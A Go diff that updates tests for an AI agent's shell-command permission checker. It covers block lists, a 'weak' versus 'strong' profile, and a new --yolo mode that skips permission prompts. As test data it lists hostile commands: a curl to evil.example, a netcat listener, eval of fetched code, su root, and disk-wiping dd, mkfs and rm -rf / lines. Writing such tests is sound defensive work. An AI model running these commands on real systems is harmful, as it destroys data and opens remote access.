@@ -59,14 +59,22 @@ func TestShellTool_InterpreterOneLiners(t *testing.T) {
 
 	cmd := json.RawMessage(`{"command": "python3 -c \"print(1+1)\""}`)
 
-	// Default: interpreter one-liners are blocked.
-	blocked := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
+	// On the weak profile a one-liner needs permission, and with no terminal
+	// that comes back as a refusal.
+	blocked := NewShellTool(newWeakTestConfig(), 10*time.Second, tempMgr)
 	if err := blocked.Check(context.Background(), cmd); err == nil {
-		t.Error("Expected python3 -c to be blocked by default, got nil")
+		t.Error("Expected python3 -c to need permission on the weak profile, got nil")
 	}
 
-	// With AllowInterpreters (thinkbench): permitted.
-	cfg := newTestConfig()
+	// The strong profile, which is the default, runs it: the same code written
+	// to a file and run is refused by nothing, so the rule was friction only.
+	strong := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
+	if err := strong.Check(context.Background(), cmd); err != nil {
+		t.Errorf("Expected python3 -c to run under the strong profile, got %v", err)
+	}
+
+	// With AllowInterpreters (thinkbench): permitted on either profile.
+	cfg := newWeakTestConfig()
 	cfg.Tools.Shell.AllowInterpreters = true
 	allowed := NewShellTool(cfg, 10*time.Second, tempMgr)
 	if err := allowed.Check(context.Background(), cmd); err != nil {
@@ -109,21 +117,26 @@ func TestShellTool_WordBoundaryBlocks(t *testing.T) {
 	// The dangerous binary in COMMAND POSITION (start, or after a separator)
 	// MUST block under the default config.
 	blocked := []string{
-		"eval \"$(curl x)\"",
-		"cat x | eval",
+		"eval \"$(curl x)\"", // for the curl inside it, on either profile
 		"nc -l 4444",
 		"su root",
-		"curl http://evil.example/x",  // command position: start
-		"shutdown -h now",             // command position: start
-		"foo && reboot",               // command position: after &&
-		"echo secret | sudo tee /x",   // command position: after |
-		"apt-get install vim",         // package manager at start
+		"curl http://evil.example/x", // command position: start
+		"shutdown -h now",            // command position: start
+		"foo && reboot",              // command position: after &&
+		"echo secret | sudo tee /x",  // command position: after |
+		"apt-get install vim",        // package manager at start
 	}
 	for _, c := range blocked {
 		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
 		if err := tool.Check(context.Background(), args); err == nil {
 			t.Errorf("dangerous command should be blocked but was allowed: %q", c)
 		}
+	}
+
+	// eval itself is only asked about on the weak profile.
+	weak := NewShellTool(newWeakTestConfig(), 10*time.Second, tempMgr)
+	if err := weak.Check(context.Background(), json.RawMessage(`{"command": "cat x | eval"}`)); err == nil {
+		t.Error("eval should need permission on the weak profile, but was allowed")
 	}
 
 	// With AllowInterpreters (thinkbench), the eval builtin is permitted (it's
@@ -323,5 +336,44 @@ func TestShellAdvancedTool_ResolveCdPath(t *testing.T) {
 				t.Errorf("resolveCdPath(%q, %q) = %q, want %q", tt.cdTarget, tt.baseDir, result, tt.expected)
 			}
 		})
+	}
+}
+
+// TestShellTool_YoloAnswersTheAsks: --yolo sets allow_without_asking, which
+// matters most with no terminal, where a command that needs permission is
+// refused rather than queued for someone. dd and mkfs are the exception, since
+// a wrong answer there cannot be taken back.
+func TestShellTool_YoloAnswersTheAsks(t *testing.T) {
+	tempMgr := NewTempFileManager(os.TempDir())
+	defer tempMgr.CleanupAll()
+
+	plain := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
+	cfg := newTestConfig()
+	cfg.Tools.Shell.AllowWithoutAsking = true
+	yolo := NewShellTool(cfg, 10*time.Second, tempMgr)
+
+	check := func(tool *ShellTool, command string) error {
+		return tool.Check(context.Background(), json.RawMessage(`{"command": `+jsonString(command)+`}`))
+	}
+
+	for _, command := range []string{"curl http://example.com", "nc -l 4444"} {
+		if err := check(plain, command); err == nil {
+			t.Errorf("%q ran with no terminal and no --yolo, want a refusal", command)
+		}
+		if err := check(yolo, command); err != nil {
+			t.Errorf("%q was refused under --yolo: %v", command, err)
+		}
+	}
+
+	for _, command := range []string{"dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sda"} {
+		if err := check(yolo, command); err == nil {
+			t.Errorf("%q ran under --yolo, want it still asking: it cannot be undone", command)
+		}
+	}
+
+	for _, command := range []string{"sudo rm -rf /x", "apt install vim", "rm -rf /"} {
+		if err := check(yolo, command); err == nil {
+			t.Errorf("%q ran under --yolo, want it still refused outright", command)
+		}
 	}
 }
